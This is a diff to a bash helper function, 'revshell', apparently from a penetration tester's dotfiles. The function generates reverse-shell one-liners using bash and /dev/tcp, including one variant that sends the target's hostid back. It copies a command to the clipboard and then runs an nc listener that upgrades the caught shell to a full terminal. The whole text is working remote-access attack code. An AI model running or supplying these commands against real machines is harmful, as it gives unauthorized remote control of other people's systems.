@@ -86,19 +86,22 @@ wscale(){
 revshell(){
 local port
 [[ -z "$1" ]] && port=8080 || port="$1"
-echo "bash -c \"bash -i &> /dev/tcp/$(mip)/"$port" 0>&1\"" #command to send on the computer to access
-printf "bash -c \"bash -i &> /dev/tcp/$(mip)/"$port" 0>&1\"" | xclip -selection clipboard
+local command="bash -c \"bash -i &> /dev/tcp/$(mip)/"$port" 0>&1\""
+local command2="bash -c \"exec 3<>/dev/tcp/$(mip)/$port;echo \$(hostid)>&3;bash -i 0>&3 1>&3 2>&3\"" #command to send on the computer to access
+echo $command
+echo $command2
+echo -n $command | xclip -selection clipboard
 local rows=$(stty -a | cut -d";" -f2 | cut -d" " -f3 | head -n1)
 local columns=$(stty -a | cut -d";" -f3 | cut -d" " -f3 | head -n1)
-bash -c "
+
 stty raw -echo
 (
-printf \"exec python -c \'import pty; pty.spawn(\\\"bash\\\")\'
+printf "
+exec script -q /dev/null
 stty rows $rows cols $columns
 clear
-\";cat) |
-nc -l $port
-"
+";cat) | nc -l $port
+
 stty sane
 }
 
